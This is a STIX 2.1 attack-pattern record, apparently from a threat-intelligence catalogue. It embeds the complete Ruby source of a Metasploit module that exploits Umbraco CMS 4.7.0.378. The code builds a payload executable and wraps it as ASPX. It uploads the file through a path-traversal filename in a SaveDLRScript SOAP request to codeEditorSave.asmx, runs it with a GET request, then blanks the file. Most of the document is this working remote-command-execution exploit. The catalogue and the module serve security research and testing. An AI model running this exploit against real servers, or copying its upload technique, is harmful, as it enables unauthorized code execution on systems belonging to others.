{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d2fc5156-4b24-42c4-9aab-c849cd215d5a",
    "created": "2024-08-14T16:52:59.941739Z",
    "modified": "2024-08-14T16:52:59.941743Z",
    "name": "Umbraco CMS Remote Command Execution",
    "description": " This module can be used to execute a payload on Umbraco CMS 4.7.0.378. The payload is uploaded as an ASPX script by sending a specially crafted SOAP request to codeEditorSave.asmx, which permits unauthorized file upload via the SaveDLRScript operation. SaveDLRScript is also subject to a path traversal vulnerability, allowing code to be placed into the web-accessible /umbraco/ directory.  The module writes, executes and then overwrites an ASPX script; note that though the script content is removed, the file remains on the target. Automatic cleanup of the file is intended if a meterpreter payload is used.  This module has been tested successfully on Umbraco CMS 4.7.0.378 on a Windows 7 32-bit SP1. In this scenario, the \"IIS APPPOOL\\ASP.NET v4.0\" user must have write permissions on the Windows Temp folder. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/umbraco_upload_aspx.rb",
            "external_id": "umbraco_upload_aspx.rb"
        },
        {
            "source_name": "reference",
            "url": "http://blog.gdssecurity.com/labs/2012/7/3/find-bugs-faster-with-a-webmatrix-local-reference-instance.html"
        },
        {
            "source_name": "reference",
            "url": "http://umbraco.codeplex.com/workitem/18192#Itemdeletedforsecurityreasons"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n\n  def initialize\n    super(\n      'Name'          => 'Umbraco CMS Remote Command Execution',\n      'Description'   => %q{\n          This module can be used to execute a payload on Umbraco CMS 4.7.0.378.\n        The payload is uploaded as an ASPX script by sending a specially crafted\n        SOAP request to codeEditorSave.asmx, which permits unauthorized file upload\n        via the SaveDLRScript operation. SaveDLRScript is also subject to a path\n        traversal vulnerability, allowing code to be placed into the web-accessible\n        /umbraco/ directory.\n\n        The module writes, executes and then overwrites an ASPX script; note that\n        though the script content is removed, the file remains on the target. Automatic\n        cleanup of the file is intended if a meterpreter payload is used.\n\n        This module has been tested successfully on Umbraco CMS 4.7.0.378 on a Windows\n        7 32-bit SP1. In this scenario, the \"IIS APPPOOL\\ASP.NET v4.0\" user must have\n        write permissions on the Windows Temp folder.\n      },\n      'Author'      => [\n        'Toby Clarke', # Vulnerability discovery and Metasploit module\n        'juan vazquez' # Improved version of the Metasploit module\n      ],\n      'Platform'    => 'win',\n      'References'  =>\n        [\n          [ 'OSVDB', '83765' ],\n          [ 'EDB', '19671' ],\n          [ 'URL', 'http://blog.gdssecurity.com/labs/2012/7/3/find-bugs-faster-with-a-webmatrix-local-reference-instance.html' ],\n          [ 'URL', 'http://umbraco.codeplex.com/workitem/18192' ] # Item deleted for security reasons\n        ],\n      'Targets'     =>\n        [\n          [ 'Umbraco CMS 4.7.0.378 / Microsoft Windows 7 Professional 32-bit SP1', { } ],\n        ],\n      'DefaultTarget'  => 0,\n      'Privileged'     => false,\n      'DisclosureDate' => 'Jun 28 2012'\n    )\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The URI path of the Umbraco login page', '/umbraco/'])\n      ])\n\n    self.needs_cleanup = true\n  end\n\n  #\n  # Remove the asmx if we get a meterpreter.\n  #\n  def on_new_session(cli)\n    if cli.type != 'meterpreter'\n      print_error(\"Meterpreter not used. Please manually remove #{@upload_random + '.aspx'}\")\n      return\n    end\n\n    cli.core.use(\"stdapi\") if not cli.ext.aliases.include?(\"stdapi\")\n\n    begin\n      aspx = @upload_random + '.aspx'\n\n      print_status(\"Searching: #{aspx}\")\n      files = cli.fs.file.search(\"\\\\\", aspx)\n      if not files or files.empty?\n        print_error(\"Unable to find #{aspx}. Please manually remove it.\")\n        return\n      end\n\n      files.each { |f|\n        print_warning(\"Deleting: #{f['path'] + \"\\\\\" + f['name']}\")\n        cli.fs.file.rm(f['path'] + \"\\\\\" + f['name'])\n      }\n      print_good(\"#{aspx} deleted\")\n    rescue ::Exception => e\n      print_error(\"Unable to delete #{aspx}: #{e.message}\")\n    end\n  end\n\n  # Module based heavily upon Juan Vazquez's 'landesk_thinkmanagement_upload_asp.rb'\n  def exploit\n    # Generate the ASPX containing the EXE containing the payload\n    exe = generate_payload_exe\n    aspx = Msf::Util::EXE.to_exe_aspx(exe)\n\n    # htmlentities like encoding\n    aspx = aspx.gsub(\"&\", \"&amp;\").gsub(\"\\\"\", \"&quot;\").gsub(\"'\", \"&#039;\").gsub(\"<\", \"&lt;\").gsub(\">\", \"&gt;\")\n\n    uri_path = target_uri.path\n    uri_path.path << \"/\" if uri_path[-1, 1] != \"/\"\n\n    @upload_random = rand_text_alpha(rand(6) + 6)\n\n    soap = <<-eos\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <SaveDLRScript xmlns=\"http://tempuri.org/\">\n      <fileName>/..\\\\..\\\\..\\\\umbraco\\\\#{@upload_random}.aspx</fileName>\n      <oldName>string</oldName>\n      <fileContents>#{aspx}</fileContents>\n      <ignoreDebugging>1</ignoreDebugging>\n    </SaveDLRScript>\n  </soap:Body>\n</soap:Envelope>\n    eos\n\n    #\n    # UPLOAD\n    #\n\n    attack_url = uri_path + \"webservices/codeEditorSave.asmx\"\n    print_status(\"Uploading #{aspx.length} bytes through #{attack_url}...\")\n    print_status(\"Uploading to #{uri_path}#{@upload_random}.aspx\")\n\n    res = send_request_cgi({\n      'uri'          => attack_url,\n      'method'       => 'POST',\n      'ctype'        => 'text/xml; charset=utf-8',\n      'headers'\t=> {\n          'SOAPAction'     => \"\\\"http://tempuri.org/SaveDLRScript\\\"\",\n        },\n      'data'         => soap,\n    }, 20)\n\n    if (! res)\n      print_status(\"Timeout: Trying to execute the payload anyway\")\n    elsif (res.code = 500 and res.body =~ /Cannot use a leading .. to exit above the top directory/)\n      print_status(\"Got the expected 500 error code #{attack_url} [#{res.code} #{res.message}]\")\n    else\n      print_status(\"Didn't get the expected 500 error code #{attack_url} [#{res.code} #{res.message}]. Trying to execute the payload anyway\")\n    end\n\n    #\n    # EXECUTE\n    #\n\n    upload_path = uri_path + \"#{@upload_random}.aspx\"\n    print_status(\"Executing #{upload_path}...\")\n\n    res = send_request_cgi({\n      'uri'          =>  upload_path,\n      'method'       => 'GET'\n    }, 20)\n\n    if (! res)\n      print_error(\"Execution failed on #{upload_path} [No Response]\")\n      return\n    end\n\n    if (res.code < 200 or res.code > 302)\n      print_error(\"Execution failed on #{upload_path} [#{res.code} #{res.message}]\")\n      return\n    end\n\n    #\n    # 'DELETE' - note that the file will remain on the system, but the content will be wiped.\n    #\n\n    soap = <<-eos\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <SaveDLRScript xmlns=\"http://tempuri.org/\">\n      <fileName>/..\\\\..\\\\..\\\\umbraco\\\\#{@upload_random}.aspx</fileName>\n      <oldName>string</oldName>\n      <fileContents></fileContents>\n      <ignoreDebugging>1</ignoreDebugging>\n    </SaveDLRScript>\n  </soap:Body>\n</soap:Envelope>\n    eos\n\n    attack_url = uri_path + \"webservices/codeEditorSave.asmx\"\n    print_status(\"Writing #{aspx.length} bytes through #{attack_url}...\")\n    print_status(\"Wrting over #{uri_path}#{@upload_random}.aspx\")\n\n    res = send_request_cgi({\n      'uri'          => attack_url,\n      'method'       => 'POST',\n      'ctype'        => 'text/xml; charset=utf-8',\n      'headers'\t=> {\n          'SOAPAction'     => \"\\\"http://tempuri.org/SaveDLRScript\\\"\",\n        },\n      'data'         => soap,\n    }, 20)\n\n    if (! res)\n      print_error(\"Deletion failed at #{attack_url} [No Response]\")\n      return\n    elsif (res.code = 500 and res.body =~ /Cannot use a leading .. to exit above the top directory/)\n      print_status(\"Got the expected 500 error code #{attack_url} [#{res.code} #{res.message}]\")\n    else\n      print_status(\"Didn't get the code and message #{attack_url} [#{res.code} #{res.message}]\")\n    end\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "Jun 28 2012",
    "x_mitre_platforms": [
        "win'"
    ]
}